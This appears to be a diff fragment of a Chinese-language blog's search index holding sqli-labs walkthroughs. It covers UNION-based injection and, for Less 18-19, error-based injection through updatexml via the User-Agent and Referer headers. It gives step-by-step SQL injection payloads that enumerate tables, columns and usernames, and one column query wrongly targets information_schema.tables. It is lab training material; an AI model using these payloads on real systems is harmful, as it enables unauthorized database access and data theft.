-3、在数据库中按username查询，若用户存在则将查询到用户id、username、password回显；若不存在…
-由此我们可以使用union联合查询进行注入
-
--判断字段数
-admin&apos; order by 4#
-
--判断回显字段
--admin&apos; union select 1,2,3#
-
--查表
--admin&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database()#
-
--查列
--admin&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name =&apos;users&apos; #
-
--查数据
--admin&apos; union select 1,group_concat(username),3 from users #</code></pre>]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>sqli-lab</tag>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-lab Less(18-19)</title>
-    <url>/2020/07/28/sqli-lab-Less-18-19/</url>
-    <content><![CDATA[<p>Less -18<br>    这一关考察 Header Injection</p>
-<pre><code>直接bp抓包分析</code></pre><p><img src="/2020/07/28/sqli-lab-Less-18-19/1.png" alt></p>
-<a id="more"></a>
-
-<pre><code>可以看到将user-agent改为aaa,右侧的回显也是aaa</code></pre><p><img src="/2020/07/28/sqli-lab-Less-18-19/2.png" alt></p>
-<pre><code>加个单引号，可以看到发生了语法错误，证明这里存在注入点。
-
-接下来就是正常注入，这里不知道为什么，如果你用注释符这里会报错如：</code></pre><p><img src="/2020/07/28/sqli-lab-Less-18-19/3.png" alt></p>
-<pre><code>所以我只能用 &apos;1&apos; = &apos;1  进行闭合
-
--查表
-aaa&apos; and updatexml(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x3a),1) and &apos;1&apos; = &apos;1
-
-这里输出的数据被限制了，采用limit绕过
-
-aaa&apos; and updatexml(1,concat(0x3a,(select table_name from information_schema.tables where table_schema = database() limit 0,1),0x3a),1) and &apos;1&apos; = &apos;1
-
--查列
-aaa&apos; and updatexml(1,concat(0x3a,(select column_name from information_schema.tables where table_name = &apos;users&apos; limit 0,1),0x3a),1) and &apos;1&apos; = &apos;1
-
--查数据
-aaa&apos; and updatexml(1,concat(0x3a,(select  username from users limit 0,1),0x3a),1) and &apos;1&apos; = &apos;1</code></pre><p>————分割线————–</p>
-<p>Less -19</p>
-<pre><code>19关与18相同，只是注入位置变为Referer其他条件不变</code></pre>]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>sqli-lab</tag>
-        <tag>sql注入</tag>
       </tags>
   </entry>
 </search>
